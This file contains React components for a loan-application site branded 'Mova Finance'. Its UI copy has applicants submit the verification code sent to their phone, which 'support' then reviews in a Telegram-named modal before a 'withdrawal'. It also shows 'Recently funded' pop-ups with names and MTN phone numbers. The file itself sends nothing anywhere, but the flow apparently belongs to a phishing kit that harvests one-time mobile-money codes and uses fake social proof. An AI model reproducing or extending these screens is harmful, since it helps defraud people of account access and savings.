import {
  ArrowRight,
  CheckCircle2,
  ChevronRight,
  Menu,
  ShieldCheck,
  X
} from 'lucide-react';

export function Brand({ as: Element = 'a', className = '', onClick, href = '#home' }) {
  return (
    <Element className={`brand ${className}`.trim()} href={Element === 'a' ? href : undefined} onClick={onClick}>
      <span className="brand-symbol">m</span>
      <span>Mova Finance</span>
    </Element>
  );
}

export function SiteHeader({ mobileOpen = false, onToggleMenu, home = false, onHome, nav, actions }) {
  return (
    <header className="site-header">
      {home ? <Brand /> : <Brand as="button" className="brand-button" onClick={onHome} />}
      {home ? (
        <>
          <nav className={mobileOpen ? 'site-nav open' : 'site-nav'}>{nav}</nav>
          <div className="header-actions">{actions}</div>
          <button className="menu-button" onClick={onToggleMenu} aria-label="Toggle menu">
            {mobileOpen ? <X size={21} /> : <Menu size={21} />}
          </button>
        </>
      ) : (
        <div className="header-actions masthead-actions">{actions}</div>
      )}
    </header>
  );
}

export function PageShell({ children, className = '' }) {
  return <div className={`page-shell ${className}`.trim()}>{children}</div>;
}

export function PageBanner({ eyebrow, title, meta, compact = false }) {
  return (
    <section className={`page-banner ${compact ? 'compact-banner' : ''}`.trim()}>
      <div>
        <span className="eyebrow">{eyebrow}</span>
        <h1>{title}</h1>
      </div>
      {meta && <div className="offer-meta">{meta}</div>}
    </section>
  );
}

export function Field({ label, name, value, onChange, error, ...props }) {
  return (
    <label className="field">
      <span>{label}</span>
      <input name={name} value={value} onChange={onChange} aria-invalid={Boolean(error)} {...props} />
      {error && <small className="field-error">{error}</small>}
    </label>
  );
}

export function LoanAmountControl({ amount, range, onAmountChange, compact = false }) {
  return (
    <div className={compact ? 'finder-amount' : 'loan-amount-control'}>
      <div className={compact ? 'finder-amount-heading' : 'loan-control-heading'}>
        <span>{compact ? 'Amount you want to apply for' : 'How much would you like?'}</span>
        <strong>{amount}</strong>
      </div>
      <input aria-label="Loan amount" type="range" min={range.min} max={range.max} step="500" value={range.value} onChange={(event) => onAmountChange(Number(event.target.value))} />
      <div className="range-labels"><span>{range.minLabel}</span><span>{range.maxLabel}</span></div>
    </div>
  );
}

export function TermSelector({ term, onTermChange, compact = false }) {
  return (
    <div className={compact ? 'finder-term' : 'loan-amount-control'}>
      <div className={compact ? 'finder-amount-heading' : 'loan-control-heading'}>
        <span>Repayment period</span>
        <strong>{term} months</strong>
      </div>
      <div className="term-row">
        {[12, 24, 36, 48].map((option) => (
          <button key={option} type="button" className={term === option ? 'term selected' : 'term'} onClick={() => onTermChange(option)}>
            {option} months
          </button>
        ))}
      </div>
    </div>
  );
}

export function WizardActions({ backLabel = 'Back', nextLabel = 'Continue', onBack, onNext, nextDisabled = false, nextIcon = <ChevronRight size={16} /> }) {
  return (
    <div className="wizard-actions">
      <button type="button" className="secondary-button" onClick={onBack}>{backLabel}</button>
      <button type="button" className="primary-button" disabled={nextDisabled} onClick={onNext}>{nextLabel} {nextIcon}</button>
    </div>
  );
}

export function LoadingOverlay({ message }) {
  return (
    <div className="loading-overlay" role="status" aria-live="polite" aria-busy="true">
      <div className="loading-panel">
        <div className="loading-header">
          <Brand className="loading-brand" />
          <span className="security-badge">Secure review</span>
        </div>
        <div className="spinner-wrap"><div className="spinner" aria-hidden="true" /></div>
        <div className="loading-text">{message}</div>
        <div className="loading-progress" aria-hidden="true"><span /></div>
      </div>
    </div>
  );
}

export function TelegramReviewModal({ stage }) {
  const finalReview = stage === 'final-verification';
  const withdrawalReview = stage === 'withdrawal';

  return (
    <div className="telegram-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="telegram-review-title">
      <div className="telegram-modal telegram-waiting-modal">
        <div className="telegram-waiting-icon"><div className="spinner" aria-hidden="true" /></div>
        <span className="eyebrow">Secure review</span>
        <h2 id="telegram-review-title">{finalReview ? 'Completing final verification' : withdrawalReview ? 'Confirming your withdrawal' : 'Verifying your message'}</h2>
        <p>{finalReview ? 'Your code is being reviewed by Mova Finance support. Please wait while we complete your application.' : withdrawalReview ? 'Your withdrawal details are being reviewed. Please wait before continuing to message verification.' : 'Your verification message is being reviewed. Please wait while we complete the withdrawal check.'}</p>
        <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
      </div>
    </div>
  );
}

export function ApprovalResultModal({ stage, onContinue }) {
  const withdrawal = stage === 'withdrawal';

  return (
    <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="approval-result-title">
      <div className="success-modal">
        <div className="success-modal-icon"><CheckCircle2 size={34} /></div>
        <span className="eyebrow">{withdrawal ? 'Withdrawal approved' : 'Verification approved'}</span>
        <h2 id="approval-result-title">{withdrawal ? 'Your withdrawal is ready' : 'Your verification is complete'}</h2>
        <p>{withdrawal ? 'Lovely, your withdrawal details are approved. Continue below to enter the verification message sent to your phone.' : 'Thank you, your verification message has been received and approved. Continue to the final verification step.'}</p>
        <button type="button" className="primary-button" onClick={onContinue}>Continue <ArrowRight size={16} /></button>
      </div>
    </div>
  );
}

export function RecentFundingToast({ item }) {
  return (
    <div className="recent-popup" role="status" aria-live="polite">
      <span className="recent-popup-icon"><CheckCircle2 size={15} /></span>
      <div>
        <span>Recently funded</span>
        <strong>{item.name} received {item.amount}</strong>
        <small>{item.type} · MTN {item.phone}</small>
      </div>
    </div>
  );
}

export function SecureNote() {
  return <span className="hero-note"><ShieldCheck size={15} /> Secure application</span>;
}

export { ArrowRight };
